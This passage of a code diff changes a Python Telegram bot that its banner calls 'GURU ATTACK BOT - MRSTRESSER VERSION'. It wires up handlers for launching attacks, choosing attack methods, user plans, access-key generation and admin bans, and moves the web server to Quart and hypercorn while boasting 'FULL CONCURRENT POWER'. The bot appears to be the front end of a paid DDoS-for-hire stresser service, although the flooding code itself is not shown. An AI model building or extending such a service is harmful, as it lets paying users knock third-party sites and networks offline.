+    app_bot.add_handler(CommandHandler("status", status_command))
+    app_bot.add_handler(CommandHandler("cancel", cancel))
     
     # CALLBACK QUERY HANDLERS
-    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
-    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
-    app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
-    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
-    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
-    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
-    app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
-    app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
-    app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
-    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
-    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
-    app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
-    app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
-    app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
-    app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
-    app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
-    app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
-    app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
-    app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
-    app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
-    app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
-    app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
+    app_bot.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
+    app_bot.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
+    app_bot.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
+    app_bot.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
+    app_bot.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
+    app_bot.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
+    app_bot.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
+    app_bot.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
+    app_bot.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
+    app_bot.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
+    app_bot.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
+    app_bot.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
+    app_bot.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
+    app_bot.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
+    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
     
-    loop.run_until_complete(app.initialize())
-    loop.run_until_complete(app.start())
-    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
+    loop.run_until_complete(app_bot.initialize())
+    loop.run_until_complete(app_bot.start())
+    loop.run_until_complete(app_bot.updater.start_polling(allowed_updates=Update.ALL_TYPES))
     
-    logger.info("✅ GURU Bot started!")
+    logger.info("✅ GURU Bot started with FULL CONCURRENT POWER!")
     loop.run_forever()
 
+# ===== MAIN =====
 if __name__ == "__main__":
-    print("=" * 50)
-    print("👑 GURU ATTACK BOT - MRSTRESSER VERSION")
-    print(f"⚡ TOTAL CONCURRENT: {MAX_TOTAL_CONCURRENT}")
-    print(f"⚡ PER ATTACK: {CONCURRENT_PER_ATTACK} concurrent")
-    print(f"👤 USERS: {MAX_CONCURRENT_PER_USER} max (2 attacks)")
-    print(f"👑 OWNERS: Full {MAX_TOTAL_CONCURRENT} concurrent")
+    print("=" * 60)
+    print("🔥 GURU ATTACK BOT - FULL CONCURRENT POWER 🔥")
+    print(f"⚡ TOTAL CONCURRENT: {MAX_TOTAL_CONCURRENT} attacks")
+    print(f"👤 PER USER: {MAX_CONCURRENT_PER_USER}x concurrent")
+    print(f"👑 OWNERS: Full {MAX_TOTAL_CONCURRENT}x concurrent")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
     print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
-    print("=" * 50)
+    print("=" * 60)
     
+    # Import hypercorn for async Quart
+    import hypercorn
+    from hypercorn.config import Config
+    from hypercorn.asyncio import serve
+    
+    # Start bot in background
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
     
     logger.info("✅ Bot thread started")
-    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
+    
+    # Run Quart with hypercorn
+    config = Config()
+    config.bind = [f"0.0.0.0:{PORT}"]
+    config.worker_class = "asyncio"
+    
+    asyncio.run(serve(app, config))
